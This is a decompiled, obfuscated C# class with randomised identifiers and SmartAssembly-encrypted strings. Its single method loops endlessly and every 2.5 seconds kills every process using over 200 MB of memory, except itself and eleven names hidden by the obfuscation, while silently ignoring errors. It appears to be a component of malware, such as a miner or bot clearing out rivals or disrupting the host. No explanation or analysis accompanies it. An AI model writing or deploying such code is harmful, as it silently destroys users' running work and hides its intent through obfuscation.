using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace GfIOnzejDqtqB;

public static class iFmnmYYiOrDs
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void AUloqXDohL()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107402973)) && !process.ProcessName.Contains(getString_0(107402964)) && !process.ProcessName.Contains(getString_0(107402923)) && !process.ProcessName.Contains(getString_0(107402946)) && !process.ProcessName.Contains(getString_0(107402933)) && !process.ProcessName.Contains(getString_0(107403400)) && !process.ProcessName.Contains(getString_0(107403419)) && !process.ProcessName.Contains(getString_0(107403374)) && !process.ProcessName.Contains(getString_0(107403393)) && !process.ProcessName.Contains(getString_0(107403380)) && !process.ProcessName.Contains(getString_0(107403359)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static iFmnmYYiOrDs()
	{
		Strings.CreateGetStringDelegate(typeof(iFmnmYYiOrDs));
	}
}
